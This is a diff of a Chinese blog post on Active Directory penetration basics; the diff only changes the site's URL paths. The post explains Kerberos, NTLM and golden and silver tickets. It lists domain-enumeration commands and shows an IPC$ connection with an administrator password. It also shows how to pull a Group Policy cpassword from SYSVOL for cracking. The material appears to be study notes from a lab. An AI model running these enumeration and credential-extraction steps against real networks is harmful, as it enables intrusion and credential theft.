@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/Decemberus.github-io/img/fluid.png">
-  <link rel="icon" href="/Decemberus.github-io/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,7 +19,7 @@
     <meta name="description" content="域渗透基础知识攻击域基础知识SPN服务主主体名服务主体名(SPNs)是运行在服务器上服务的唯一标识符。每一个使用Kerberos 身份验证的服务都要有个SPN以使客户端能够在网络上标识这个服务。没有正确的设置SPNs,Kerberos身份验证就是不可能的。 SPN服务可以使用别名或者主机名称向域注册SPN，注册完成后，可在域控使用ADSI编辑器连接到LDAP目录，查看服务的SPN。 身份委派Ker">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透基础知识">
-<meta property="og:url" content="https://decemberus.github.io/Decemberus.github-io/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index.html">
+<meta property="og:url" content="https://blog.decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index.html">
 <meta property="og:site_name" content="欢迎回来">
 <meta property="og:description" content="域渗透基础知识攻击域基础知识SPN服务主主体名服务主体名(SPNs)是运行在服务器上服务的唯一标识符。每一个使用Kerberos 身份验证的服务都要有个SPN以使客户端能够在网络上标识这个服务。没有正确的设置SPNs,Kerberos身份验证就是不可能的。 SPN服务可以使用别名或者主机名称向域注册SPN，注册完成后，可在域控使用ADSI编辑器连接到LDAP目录，查看服务的SPN。 身份委派Ker">
 <meta property="og:locale" content="zh_CN">
@@ -113,12 +113,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/Decemberus.github-io/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/Decemberus.github-io/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/Decemberus.github-io/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
@@ -126,10 +126,10 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"decemberus.github.io","root":"/Decemberus.github-io/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/Decemberus.github-io/local-search.xml"};
+    var CONFIG = {"hostname":"blog.decemberus.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
   </script>
-  <script  src="/Decemberus.github-io/js/utils.js" ></script>
-  <script  src="/Decemberus.github-io/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.1.0"></head>
@@ -144,7 +144,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/Decemberus.github-io/">
+    <a class="navbar-brand" href="/">
       <strong>enjoy的blog</strong>
     </a>
 
@@ -163,7 +163,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/Decemberus.github-io/">
+              <a class="nav-link" href="/">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -175,7 +175,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/Decemberus.github-io/archives/">
+              <a class="nav-link" href="/archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -187,7 +187,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/Decemberus.github-io/categories/">
+              <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -199,7 +199,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/Decemberus.github-io/tags/">
+              <a class="nav-link" href="/tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -211,7 +211,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/Decemberus.github-io/about/">
+              <a class="nav-link" href="/about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -240,7 +240,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/Decemberus.github-io/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -343,12 +343,12 @@
 <p>(3)认证结果</p>
 <p>分为本地认证和网络认证</p>
 <p>场景1:无网络时本地认证;<br>场景2:有网络，在工作组→使用;<br>场景3:在域中，当Kerberos认证失败，使用;</p>
-<h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230713200549120.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230713200549120"> </p>
+<h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230713200549120.png" srcset="/img/loading.gif" lazyload alt="image-20230713200549120"> </p>
 <p>RDP协议3389远程桌面适用场景2和3</p>
 <p>用户登陆windows 时，windows首先会调用winlogon.exe进程接收用户输入的密码，之后密码会被传递给lsass.exe进程，进程会先在内存中存储一份明文密码，并将密码加密为NTLM hash，与本地SAM数据库中用户的NTLM hash对比，一致则登陆成功</p>
-<h3 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230713200319344.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230713200319344"> </p>
-<p><img src="D:\mdimage\image-20230713200335710.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230713200335710"> </p>
-<p><img src="D:\mdimage\image-20230713200416832.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230713200416832"> </p>
+<h3 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230713200319344.png" srcset="/img/loading.gif" lazyload alt="image-20230713200319344"> </p>
+<p><img src="D:\mdimage\image-20230713200335710.png" srcset="/img/loading.gif" lazyload alt="image-20230713200335710"> </p>
+<p><img src="D:\mdimage\image-20230713200416832.png" srcset="/img/loading.gif" lazyload alt="image-20230713200416832"> </p>
 <h2 id="Kerberos身份认证"><a href="#Kerberos身份认证" class="headerlink" title="Kerberos身份认证"></a>Kerberos身份认证</h2><p>KDC(Key Distribution center)：密钥分发中心，在域环境中，KDC服务默认会安装在域控中。</p>
 <p>AS(Authentication Service)：认证服务，验证client的credential(身份认证信息)，发放TGT。</p>
 <p>TGT(Ticket Granting ticket)：票据授权票据，由KDC的AS发放，客户端获取到该票据后，以后申请其他应用的服务票据(ST)时，就不需要向KDC的AS提交身份认证信息(credential)，TGT具有一定的有效期。</p>
@@ -356,7 +356,7 @@
 <p>ST(Service Ticket)：服务票据，由KDC的TGS发放，是客户端应用程序访问Server某个服务的凭证，Server端验证通过则完成Client与Server端信任关系的建立。</p>
 <p>先由简到繁地去梳理以上术语的关系。首先Client想要访问Server的某个服务，就需要通过KDC的认证，获取到服务票据（ST），服务会验证服务票据（ST）来判断Client是否通过了KDC认证。为了避免Client每次访问Server的服务都要向KDC认证(输入密码)，KDC设计时分成了两个部分，一个是AS，另一个是TGS，AS接收Client的认证信息，认证通过后给Client发放一个可重复使用的票据TGT，后续Client使用这个TGT向TGS请求ST即可。</p>
 <p>Authenticator：验证器，不能重复使用，与票据（时效内能重复使用）结合用来证明Client声明的身份，防止票据被冒用。</p>
-<p>  <img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726202206895.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230726202206895"> </p>
+<p>  <img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726202206895.png" srcset="/img/loading.gif" lazyload alt="image-20230726202206895"> </p>
 <h2 id="金票据与银票据"><a href="#金票据与银票据" class="headerlink" title="金票据与银票据"></a>金票据与银票据</h2><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
 <p>黄金票据常用于权限维持。 当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用krbtgt用户的ntlm hash制作黄金票据伪造tgt，重新获取域控的管理权限。</p>
 <p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p>
@@ -364,40 +364,40 @@
 <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
 
 <p>查看与管理成员用户组</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185534416.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719185534416"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185534416.png" srcset="/img/loading.gif" lazyload alt="image-20230719185534416"> </p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
 
 <p>查看域机器</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185457466.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719185457466"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185457466.png" srcset="/img/loading.gif" lazyload alt="image-20230719185457466"> </p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
 
 <p>查看域控制器</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185403299.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719185403299"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185403299.png" srcset="/img/loading.gif" lazyload alt="image-20230719185403299"> </p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.1.1\ipc$ <span class="hljs-string">&quot;tyhcwfc168lyj.&quot;</span> /user:<span class="hljs-string">&quot;administrator&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\192.168.1.1\c$<br></code></pre></td></tr></table></figure>
 
 <p>建立空对话并将目标的c盘映射到z盘</p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> <span class="hljs-symbol">z:</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;tyhcwfc168lyj.&quot;</span> /<span class="hljs-symbol">user:</span><span class="hljs-string">&quot;administrator&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>上面的命令一气和成版，可以发现多了一个被控盘</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185603217.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719185603217"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185603217.png" srcset="/img/loading.gif" lazyload alt="image-20230719185603217"> </p>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> share<br></code></pre></td></tr></table></figure>
 
 <p>查看SMB指向的路径</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185705971.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719185705971"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185705971.png" srcset="/img/loading.gif" lazyload alt="image-20230719185705971"> </p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> view <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
 
 <p>查看ip共享</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain <span class="hljs-keyword">test</span>.com<br></code></pre></td></tr></table></figure>
 
 <p>查看域列表</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185920771.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719185920771"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185920771.png" srcset="/img/loading.gif" lazyload alt="image-20230719185920771"> </p>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span><br></code></pre></td></tr></table></figure>
 
 <p>查看当前运行的服务</p>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> accounts<br></code></pre></td></tr></table></figure>
 
 <p>查看本地密码策略</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719190106173.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719190106173"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719190106173.png" srcset="/img/loading.gif" lazyload alt="image-20230719190106173"> </p>
 <p>如果在后面加上一个&#x2F;domain则是查看域的用户策略</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nbtstat</span> -a <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
 
@@ -408,7 +408,7 @@
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure>
 
 <p>查看路由表</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719190331857.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719190331857"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719190331857.png" srcset="/img/loading.gif" lazyload alt="image-20230719190331857"> </p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/V</span><br></code></pre></td></tr></table></figure>
 
 <p>查进程（对应用户的），可以后跟管道符查询对应的进程</p>
@@ -440,12 +440,12 @@
 
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719195910649.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719195910649"> </p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719195927706.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719195927706"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719195910649.png" srcset="/img/loading.gif" lazyload alt="image-20230719195910649"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719195927706.png" srcset="/img/loading.gif" lazyload alt="image-20230719195927706"> </p>
 <h3 id="多台域控"><a href="#多台域控" class="headerlink" title="多台域控"></a>多台域控</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">nltest /DCLIST:<span class="hljs-keyword">test</span>.com<br></code></pre></td></tr></table></figure>
 
 <p>DCLIST代表Domain Controller List</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719200340212.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719200340212"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719200340212.png" srcset="/img/loading.gif" lazyload alt="image-20230719200340212"> </p>
 <h3 id="查看域控组相关信息"><a href="#查看域控组相关信息" class="headerlink" title="查看域控组相关信息"></a>查看域控组相关信息</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Domain</span> Controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
 
 <p>查看域管主机名</p>
@@ -455,13 +455,13 @@
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net gruop /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>
 
 <p>查看OU（组织单位）组织</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719200805235.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719200805235"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719200805235.png" srcset="/img/loading.gif" lazyload alt="image-20230719200805235"> </p>
 <h3 id="其他场景"><a href="#其他场景" class="headerlink" title="其他场景"></a>其他场景</h3><p>DNS地址通常就是域控地址</p>
 <p>或者可以查看是否开放53，389，88端口</p>
 <h2 id="信息搜集SPN"><a href="#信息搜集SPN" class="headerlink" title="信息搜集SPN"></a>信息搜集SPN</h2><p>SPN（注册服务主体名称）是个公开的服务，都可以访问，这样就无法区分是正常的还是攻击者</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -s mysqlspn/test.com administrator<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719201345393.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230719201345393"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719201345393.png" srcset="/img/loading.gif" lazyload alt="image-20230719201345393"> </p>
 <p>注册spn</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -t test -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></table></figure>
 
@@ -475,74 +475,74 @@
 <p>可以使用客户端命令查看目录结构</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tree /f \\test.com\sysvol\<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183256721.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720183256721"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183256721.png" srcset="/img/loading.gif" lazyload alt="image-20230720183256721"> </p>
 <p>可以看到这里其实是没有一个计划任务xml文件的</p>
 <p>用客户端在在控制面板中找到组策略管理</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183552936.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720183552936"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183552936.png" srcset="/img/loading.gif" lazyload alt="image-20230720183552936"> </p>
 <p>新建一个TEST创建GPO后编辑组策略管理器</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183755012.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720183755012"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183755012.png" srcset="/img/loading.gif" lazyload alt="image-20230720183755012"> </p>
 <p>在首选项里面写一个计划任务</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720184504512.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720184504512"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720184504512.png" srcset="/img/loading.gif" lazyload alt="image-20230720184504512"> </p>
 <p>可以看到出现了这个xml</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720184615014.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720184615014"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720184615014.png" srcset="/img/loading.gif" lazyload alt="image-20230720184615014"> </p>
 <p>按照他的路径可以找到这个xml</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">PS C:\Users\Administrator&gt; Get-Content \\test.com\sysvol\test.com\Policies\&quot;&#123;5A13E73C-68CA-4D5A-B0F4-6F624169B2C8&#125;&quot;\Mach<br>ine\Preferences\ScheduledTasks\ScheduledTasks.xml<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ScheduledTasks</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;&#123;CC63F200-7309-4ba0-B154-A71CD118DBCC&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Task</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;&#123;2DEECB1C-261F-4e13-9B21-16FB83BC03BD&#125;&quot;</span> <span class="hljs-attr">nam</span></span><br><span class="hljs-tag"><span class="hljs-attr">e</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">image</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">changed</span>=<span class="hljs-string">&quot;2023-07-20 10:45:09&quot;</span> <span class="hljs-attr">uid</span>=<span class="hljs-string">&quot;&#123;992B3D03-FCFB-427A-A6CC-B2018E8B1399&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Properties</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;U&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">name</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">appName</span>=<span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-attr">args</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">startIn</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">comment</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">runAs</span>=<span class="hljs-string">&quot;TEST\Administrator&quot;</span> <span class="hljs-attr">cpassword</span>=<span class="hljs-string">&quot;1dLl2PMSed1A9KZn/hQ</span></span><br><span class="hljs-string"><span class="hljs-tag">grg&quot;</span> <span class="hljs-attr">enabled</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Triggers</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Trigger</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;DAILY&quot;</span> <span class="hljs-attr">startHour</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">startMinutes</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">beginYear</span>=<span class="hljs-string">&quot;2023&quot;</span> <span class="hljs-attr">beginMonth</span>=<span class="hljs-string">&quot;7&quot;</span> <span class="hljs-attr">beginDa</span></span><br><span class="hljs-tag"><span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">hasEndDate</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">repeatTask</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">interval</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Triggers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Properties</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Task</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ScheduledTasks</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>这里有个坑，切换路径时不能带有大括号，要使用””把大括号括起来</p>
 <p>找到这个xml文件中的cpassword字段</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720191851271.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720191851271"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720191851271.png" srcset="/img/loading.gif" lazyload alt="image-20230720191851271"> </p>
 <p>使用kali中的工具成功破解</p>
 <h2 id="MS17010-x2F-CVE2019-0708"><a href="#MS17010-x2F-CVE2019-0708" class="headerlink" title="MS17010 &#x2F;CVE2019-0708"></a>MS17010 &#x2F;CVE2019-0708</h2><p>主要用了这么几个步骤来打这个服务器</p>
